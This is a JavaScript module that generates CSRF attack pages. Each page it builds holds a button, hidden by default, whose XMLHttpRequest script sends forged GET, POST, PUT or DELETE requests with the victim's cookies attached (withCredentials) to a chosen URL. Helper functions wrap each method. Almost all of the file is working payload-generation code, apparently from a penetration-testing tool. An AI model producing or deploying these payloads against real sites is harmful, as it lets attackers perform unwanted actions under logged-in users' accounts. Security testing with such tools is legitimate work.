/**
 * XHR Template Generator
 * Generates XMLHttpRequest templates for CSRF payloads
 */

const utils = require('../core/utils');

/**
 * Generate an XHR-based CSRF payload template
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with XHR code
 */
function getXHRTemplate(params) {
  const {
    url,
    method = 'POST',
    data = {},
    headers = {},
    csrfToken = null,
    contentType = 'application/json',
    buttonId = `csrf-xhr-${Date.now()}`,
    hiddenButton = true
  } = params;
  
  // Add CSRF token to headers if provided
  const allHeaders = { ...headers };
  if (csrfToken && csrfToken.headerName) {
    allHeaders[csrfToken.headerName] = csrfToken.value || '';
  }
  
  // Convert data to appropriate format based on content type
  let formattedData;
  let dataString;
  
  if (contentType.includes('application/json')) {
    // Add CSRF token to JSON data if provided and not in headers
    if (csrfToken && csrfToken.fieldName && !csrfToken.headerName) {
      formattedData = { ...data, [csrfToken.fieldName]: csrfToken.value || '' };
    } else {
      formattedData = data;
    }
    dataString = JSON.stringify(formattedData);
  } else if (contentType.includes('application/x-www-form-urlencoded')) {
    // Add CSRF token to form data if provided and not in headers
    if (csrfToken && csrfToken.fieldName && !csrfToken.headerName) {
      formattedData = { ...data, [csrfToken.fieldName]: csrfToken.value || '' };
    } else {
      formattedData = data;
    }
    dataString = utils.serializeObject(formattedData);
  } else {
    // Default to JSON
    formattedData = data;
    dataString = JSON.stringify(formattedData);
  }
  
  // Format headers for XHR
  const headersCode = Object.entries(allHeaders)
    .map(([key, value]) => `  xhr.setRequestHeader("${key}", "${value}");`)
    .join('\n');
  
  return `
<button id="${buttonId}" ${hiddenButton ? 'class="hidden"' : ''} onclick="sendXHRRequest()">Send Request</button>

<script>
  function sendXHRRequest() {
    const xhr = new XMLHttpRequest();
    xhr.open("${method}", "${url}", true);
    xhr.withCredentials = true; // Include cookies for cross-origin requests
    ${contentType ? `xhr.setRequestHeader("Content-Type", "${contentType}");` : ''}
${headersCode}
    
    xhr.onload = function() {
      console.log("XHR request completed with status:", xhr.status);
      if (xhr.status >= 200 && xhr.status < 400) {
        console.log("XHR request successful");
      } else {
        console.log("XHR request failed");
      }
    };
    
    xhr.onerror = function() {
      console.log("XHR request failed due to network error");
    };
    
    ${method.toUpperCase() === 'GET' ? 'xhr.send();' : `xhr.send(${dataString ? '`' + dataString + '`' : 'null'});`}
  }
</script>`;
}

/**
 * Generate an XHR template for a GET request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with XHR code
 */
function getXhrGetTemplate(params) {
  return getXHRTemplate({ ...params, method: 'GET' });
}

/**
 * Generate an XHR template for a POST request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with XHR code
 */
function getXhrPostTemplate(params) {
  return getXHRTemplate({ ...params, method: 'POST' });
}

/**
 * Generate an XHR template for a PUT request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with XHR code
 */
function getXhrPutTemplate(params) {
  return getXHRTemplate({ ...params, method: 'PUT' });
}

/**
 * Generate an XHR template for a DELETE request
 * @param {Object} params - Request parameters
 * @returns {string} - HTML template with XHR code
 */
function getXhrDeleteTemplate(params) {
  return getXHRTemplate({ ...params, method: 'DELETE' });
}

// Export functions
module.exports = {
  getXHRTemplate,
  getXhrGetTemplate,
  getXhrPostTemplate,
  getXhrPutTemplate,
  getXhrDeleteTemplate
};